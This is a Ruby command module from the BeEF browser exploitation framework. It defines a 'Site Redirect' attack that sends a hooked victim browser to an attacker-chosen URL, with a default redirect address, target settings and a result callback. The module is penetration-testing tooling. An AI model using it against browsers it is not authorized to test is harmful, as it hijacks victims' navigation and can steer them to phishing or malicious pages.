class Site_redirect < BeEF::Core::Command
  
  def initialize
    super({
      'Name' => 'Site Redirect',
      'Description' => 'This module will redirect the hooked browser to the address specified in the \'Redirect URL\' input.',
      'Category' => 'Browser',
      'Author' => ['wade', 'vo'],
      'Data' => [
        { 'ui_label'=>'Redirect URL', 'name'=>'redirect_url', 'value'=>'http://www.bindshell.net/', 'width'=>'200px' }
      ],
      'File' => __FILE__
    })
    
    set_target({
      'verified_status' =>  VERIFIED_USER_NOTIFY, 
      'browser_name' =>     ALL
    })
              
    use_template!
  end

  def callback
    save({'result' => @datastore['result']})
  end
  
end